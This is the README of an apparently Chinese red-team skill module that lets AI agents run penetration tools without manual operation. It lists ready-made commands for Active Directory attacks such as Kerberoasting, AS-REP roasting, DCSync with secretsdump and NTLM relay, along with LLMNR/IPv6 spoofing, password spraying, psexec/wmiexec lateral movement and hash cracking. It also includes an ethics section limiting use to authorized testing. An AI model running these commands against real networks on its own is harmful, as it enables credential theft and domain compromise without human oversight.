# RedTeam Skill Module - AI驱动的自动化红队渗透框架

## 模块概述

本模块整合 multi-CyberSecurity 与 RedTeam-Agent 的最佳实践，提供 **Skill-first 终端工作流** 的红队渗透能力。

> **核心理念**：无需手动操作工具，AI 接管所有渗透工具，让安全测试真正自动化。

## 核心特性

| 特性 | 说明 |
|------|------|
| 🚀 **开箱即用** | 15+ 渗透工具自动安装，Windows 一键部署 |
| 🤖 **AI 驱动** | 通过 Skill + 终端，AI 直接调用渗透工具 |
| 💰 **Token 优化** | 智能输出压缩，节省 80% Token 消耗 |
| 🛡️ **域渗透完整** | BloodHound + impacket + Responder 全链路 |
| 🌐 **多平台支持** | Trae, Hermes, OpenClaw, Cursor, Claude, Codex, DSH |

## 工具矩阵

### 网络扫描工具

| 工具 | 功能 | 场景 | 命令示例 |
|------|------|------|----------|
| gogo | 极速资产发现 | 内网主机探测 | `gogo -t 100 -i hosts.txt -q -f gogo.txt` |
| fscan | 综合扫描 | 端口/漏洞/弱口令 | `fscan -h 192.168.1.0/24 -np -silent -nocolor -o fscan.txt` |
| masscan | 速率限制扫描 | 全端口扫描 | `masscan -p1-65535 192.168.1.0/24 --rate=1000` |

### Web 安全工具

| 工具 | 功能 | 场景 | 命令示例 |
|------|------|------|----------|
| httpx | Web 指纹识别 | 网站技术栈识别 | `httpx -l urls.txt -sc -title -server -td -silent -o httpx.txt` |
| nuclei | POC 批量扫描 | 已知漏洞检测 | `nuclei -l urls.txt -tags cve,rce -s high,critical -nc -o nuclei.txt` |
| ffuf | 目录 fuzzing | Web 目录爆破 | `ffuf -u http://target/FUZZ -w wordlist.txt -mc 200,301,302 -s -o ffuf.txt` |
| sqlmap | SQL 注入检测 | SQLi 探测与利用 | `sqlmap -r request.txt --batch --level=2` |

### 活动目录攻击工具 🏆

| 工具 | 功能 | 场景 | 命令示例 |
|------|------|------|----------|
| SharpHound | BloodHound收集器(Windows) | 域内数据采集 | `SharpHound.exe -c Default -d corp.local` |
| bloodhound-python | 跨平台收集器 | Linux/macOS数据采集 | `bloodhound-python -c Default -d corp.local` |
| GetNPUsers | AS-REP Roast | 枚举不需要预认证的用户 | `impacket-GetNPUsers corp.local/ -usersfile users.txt` |
| GetUserSPNs | Kerberoasting | 请求SPN票据破解 | `impacket-GetUserSPNs corp.local/user -request` |
| secretsdump | LSASS Dump | 提取明文和哈希 | `impacket-secretsdump corp.local/user:pass@dc -just-dc` |
| ntlmrelayx | NTLM Relay | 中继攻击 | `impacket-ntlmrelayx -t ldap://dc --smb2support` |
| kerbrute | Kerberos用户枚举 | 用户名暴力破解 | `kerbrute userenum -d corp.local --dc DC01 users.txt` |
| pywerview | 域信息枚举 | 用户/计算机/组 | `pywerview.py get-domain-user -d corp.local --dc-ip IP` |
| ldapdomaindump | LDAP转储 | 域信息快照 | `ldapdomaindump ldap://DC -u 'DOMAIN\user' -p 'pass'` |

### 横向移动工具

| 工具 | 功能 | 场景 | 命令示例 |
|------|------|------|----------|
| nxc (NetExec) | 多协议攻击控制台 | SMB/WinRM/SSH/LDAP | `nxc smb 192.168.1.0/24 -u user -p pass --shares` |
| wmiexec | WMI执行 | 无文件横向 | `impacket-wmiexec domain/user:pass@target 'whoami'` |
| psexec | PSEXEC | 服务执行 | `impacket-psexec domain/user:pass@target cmd.exe` |
| crackmapexec | SMB攻击 | 密码/哈希喷洒 | `crackmapexec smb targets -u users.txt -p passwords.txt` |

### 代理与凭据工具

| 工具 | 功能 | 场景 | 命令示例 |
|------|------|------|----------|
| chisel | HTTP隧道 | 端口转发 | `chisel client http://server:8080 R:0.0.0.0:80:127.0.0.1:80` |
| responder | LLMNR欺骗 | 哈希收集 | `responder -I eth0 -v` |
| mitm6 | IPv6欺骗 | WPAD劫持 | `mitm6 -d domain.local` |
| hashcat | 密码破解 | GPU加速破解 | `hashcat -m 13100 kerberoast.txt wordlist.txt` |

## AD 攻击链路

```
┌─────────────────────────────────────────────────────────────────┐
│                      攻击阶段流程图                                │
└─────────────────────────────────────────────────────────────────┘
┌───────────────┐      ┌───────────────┐      ┌───────────────┐
│    侦察阶段    │ ───► │    收集阶段    │ ───► │    分析阶段    │
└───────────────┘      └───────────────┘      └───────┬───────┘
       │                                               │
       ▼                                               ▼
┌───────────────┐                            ┌───────────────┐
│ gogo/fscan    │                            │ BloodHound GUI│
│ kerbrute      │                            │ attack_paths  │
│ pywerview     │                            │ analysis.py  │
└───────────────┘                            └───────────────┘
                                                    │
┌───────────────┐      ┌───────────────┐            │
│    攻击阶段    │ ◄─── │    移动阶段    │ ◄─────────┘
└───────────────┘      └───────────────┘
       │                       │
       ▼                       ▼
┌───────────────┐      ┌───────────────┐
│ Kerberoast    │      │ nxc smb       │
│ AS-REP Roast  │      │ wmiexec       │
│ secretsdump   │      │ psexec        │
│ ntlmrelayx    │      │ getST         │
└───────────────┘      └───────────────┘
```

## 快速开始

### 1️⃣ 环境要求
```
Python 3.8+
Windows 10/11 或 Linux/macOS
8GB+ RAM (推荐)
```

### 2️⃣ 安装工具
```bash
# 自动安装所有工具
python scripts/install_redteam_tools.py

# 或手动指定平台
python scripts/install_redteam_tools.py --platform windows
```

### 3️⃣ 启动 RedTeam 模式
```bash
# 加载 RedTeam Skill
# AI 会根据 SKILL.md 和平台指令直接执行命令

# 基础扫描示例
fscan -h 192.168.1.0/24 -np -silent -nocolor -o scan.txt

# Web 指纹识别
httpx -l targets.txt -sc -title -server -td -silent -o httpx.txt

# AD 枚举
python pywerview.py get-domain-user -d corp.local --dc-ip DC01 -u user -p pass
```

### 4️⃣ 攻击示例
```bash
# Kerberoasting
impacket-GetUserSPNs corp.local/user:password -request -outputfile kerberoast.txt

# DCSync
impacket-secretsdump corp.local/user:password@DC01 -just-dc

# WMI 横向
impacket-wmiexec corp.local/user:password@target 'whoami'
```

## Token 优化机制

| 优化项 | 说明 | 节省比例 |
|-------|------|---------|
| ANSI 去除 | 清除终端颜色代码 | ~15% |
| 空白压缩 | 合并多余空行 | ~10% |
| 输出截断 | 最大 8000 字符 | ~50% |
| 进度条过滤 | 移除进度条输出 | ~20% |
| **总计** | | **~80%** |

## 命令执行规范

### ✅ 推荐模式
```bash
# 输出到文件
command > output.txt 2>&1

# 提取关键信息
grep -E '(Valid|Found|SMB|HTTP|445|80|443|8080)' output.txt

# 去除颜色
| sed 's/\x1b\[[0-9;]*m//g'

# 去除空行
| grep -v '^$'
```

### ❌ 避免模式
```bash
# 避免: 直接输出大量原始数据
nmap -sV target

# 推荐: 定向提取
nmap -sV target -oG - | grep -E 'Ports:|Host:'
```

## 输出格式规范

### 高价值发现格式
```
=== [目标/发现] ===
类型: [漏洞/配置错误/弱凭据]
证据: [命令输出关键行]
影响: [安全影响描述]
利用: [如何利用/下一步建议]
```

### 渗透报告格式
```
## 攻击路径: [路径名称]

### 初始访问
- technique: [技术名称]
- target: [目标]
- evidence: [命令输出]

### 权限提升
- from: [起点权限]
- to: [目标权限]
- evidence: [命令输出]

### 横向移动
- technique: [技术名称]
- target: [目标]
- evidence: [命令输出]

### 影响评估
- achieved: [达成目标]
- likelihood: [可能性]
- recommendations: [修复建议]
```

## 技能调用流程

```
用户输入 ──► AI 加载 RedTeam Skill ──► 解析任务 ──► 执行工具 ──► 分析输出 ──► 报告发现
    │              │                    │              │              │              │
    ▼              ▼                    ▼              ▼              ▼              ▼
  "扫描网段"    SKILL.md           分解为子任务    调用 fscan/nmap   提取关键信息    生成报告
```

## 工具目录结构

```
24-红蓝对抗-RedTeam/
├── tools/                    # 工具二进制文件
│   ├── Network/              # 网络扫描工具
│   │   ├── fscan.exe
│   │   ├── gogo.exe
│   │   └── masscan.exe
│   ├── Web/                  # Web 安全工具
│   │   ├── httpx.exe
│   │   ├── nuclei.exe
│   │   └── ffuf.exe
│   ├── AD/                   # AD 攻击工具
│   │   ├── SharpHound.exe
│   │   ├── bloodhound-python/
│   │   └── impacket/
│   │       ├── GetNPUsers.py
│   │       ├── GetUserSPNs.py
│   │       ├── secretsdump.py
│   │       ├── wmiexec.py
│   │       ├── psexec.py
│   │       └── ntlmrelayx.py
│   └── Reverse/              # 逆向工程工具
│       ├── ghidra/
│       └── radare2/
├── skills/                   # 技能文档
│   ├── RedTeam-Skill-概述.md
│   ├── Network-Recon-Skill.md
│   ├── Web-Attack-Skill.md
│   ├── AD-Attack-Skill.md
│   └── Reverse-Engineering-Skill.md
├── scripts/                  # 自动化脚本
│   ├── install_redteam_tools.py
│   ├── output_optimizer.py
│   └── attack_chain.py
└── README.md
```

## 安全与伦理

### ✅ 在授权范围内
- CTF 挑战和竞赛
- 授权的渗透测试
- 沙盒环境测试
- 安全研究（授权范围内）

### ❌ 禁止行为
- 未经授权的系统测试
- 恶意软件生成
- 社会工程攻击自动化
- 漏洞交易市场

### 紧急程序
如果发现意外授权访问:
1. **STOP** - 立即停止操作
2. **ASSESS** - 评估影响范围
3. **REPORT** - 记录发现内容
4. **ESCALATE** - 通知相关方

---

## 相关模块

- [模块 03: 侦察与信息收集](../01-信息搜集-Reconnaissance/)
- [模块 12: 代码审计](../12-代码审计-CodeAudit/)
- [模块 18: 漏洞分析与利用](../03-漏洞利用-Exploitation/)

---

*本模块整合 multi-CyberSecurity 框架与 RedTeam-Agent 最佳实践*
